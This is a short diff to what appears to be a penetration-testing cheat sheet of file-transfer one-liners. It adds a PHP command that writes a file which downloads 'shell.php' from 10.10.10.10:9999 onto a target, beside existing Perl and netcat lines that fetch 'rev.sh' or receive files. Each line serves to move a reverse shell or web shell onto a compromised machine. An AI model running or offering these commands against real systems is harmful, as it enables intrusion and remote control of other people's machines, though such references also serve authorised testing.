@@ -55,6 +55,10 @@ Perl
 ```
 perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.10:9999/rev.sh"); my $file = $ff->fetch() or die $ff->error;'
 ```
+PHP
+```
+echo "<?php file_put_contents('nameOfFile', fopen('http://10.10.10.10:9999/shell.php', 'r')); ?>" > shell.php
+```
 Netcat:
 ```
 Victim: nc -l -p 4444 > file.sh
